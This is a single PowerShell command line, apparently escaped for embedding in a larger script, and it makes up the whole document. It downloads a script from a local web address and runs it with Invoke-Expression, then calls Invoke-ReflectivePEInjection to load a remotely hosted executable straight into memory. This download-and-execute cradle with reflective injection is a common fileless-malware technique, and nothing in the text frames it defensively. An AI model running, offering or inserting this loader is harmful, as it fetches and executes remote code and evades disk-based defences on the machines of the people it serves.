`$c = new-object system.net.webclient; `$r = `$c.DownloadData('http://127.0.0.1/files/test.ps1'); Invoke-Expression `$([System.Text.Encoding]::ASCII.GetString(`$r)); Invoke-ReflectivePEInjection -PEUrl http://127.0.0.1/files/enc3.txt